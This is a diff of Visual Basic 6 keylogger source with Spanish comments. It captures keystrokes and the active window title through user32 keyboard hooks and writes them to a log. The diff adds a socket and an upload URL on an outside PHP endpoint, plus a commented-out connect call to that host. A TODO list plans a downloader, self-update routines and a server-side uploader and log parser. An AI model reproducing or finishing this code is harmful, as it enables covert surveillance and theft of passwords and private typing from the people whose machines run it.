@@ -23,33 +23,54 @@ Attribute VB_GlobalNameSpace = False
 Attribute VB_Creatable = False
 Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = False
+'TODO's
+' - Manejar todos los errores posibles []
+' - Hacer un downloader []
+' - Rutinas para actualizar el keylogger []
+' - Hacer el Uploader, php []
+' - Hacer un Parser del log file, php []
+' - Upload String [x]
+
+
 Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
 Private Declare Function ToAscii Lib "user32" (ByVal uVirtKey As Integer, ByVal uScanCode As Integer, ByRef lpbKeyState As Byte, ByRef lpwTransKey As Integer, ByVal fuState As Integer) As Integer
+
 Public WithEvents MyEventRaiser As EventRaiser
 Attribute MyEventRaiser.VB_VarHelpID = -1
+Public WithEvents SocketUpload As CSocketMaster
+Attribute SocketUpload.VB_VarHelpID = -1
+
 Dim PressedControl As Boolean
 Dim PressedShift As Boolean
 Dim PressedAlt As Boolean
 Dim LastTimePressed As Date
 Dim Buffer As String, CntVbCrlF As Integer
 Dim VentanaActual As String
+
 Private Sub Command1_Click()
-    MsgBox ActiveWindow
+    'SocketUpload.Connect "www.angelbroz.com", 80
+    MsgBox Asc("A"), , vbKeyA
 End Sub
 
 Private Sub Form_Load()
     Set MyEventRaiser = New EventRaiser
+    Set SocketUpload = New CSocketMaster
+    UploadUrl = "http://www.angelbroz.com/kloggyx.php"
+
     Buffer = "                          [ Starting loggin at " & Now & "]"
     Save
     Buffer = ""
     LastTimePressed = Now
     CntVbCrlF = 1
-    Hook
+'    Hook
+    
 End Sub
 
 Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
     UnHook
 End Sub
+
+
 
 Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
     Dim CurrentKeyboardState(0 To 255) As Byte
@@ -123,12 +144,21 @@ Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As 
 End Sub
 
 Private Sub MyEventRaiser_KBHKeyUp(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
-    'sin usarse, serviria para usar combinaciones de teclas, mas adelante vere que rollo
+    'sin usarse, pero serviria para usar combinaciones de teclas, mas adelante vere que rollo
     Select Case vkCode
         Case vbKeyControl:                                  PressedControl = False
         Case vbKeyShift:                                    PressedShift = False
         Case OtrosVK.VK_Alt Or OtrosVK.VK_LAlt:             PressedAlt = False
     End Select
+End Sub
+
+Private Sub MyEventRaiser_ErrorDetected(ByVal ErrStr As String)
+    On Error Resume Next ' <---- LOL!!! hahaha
+    Dim tmpString As String
+    tmpString = "[Error detected: " & Now & "ErrMsg:" & ErrStr & "]"
+    Open "C:\status.akl" For Append As #1
+        Print #1, tmpString
+    Close #1
 End Sub
 
 Sub Save()
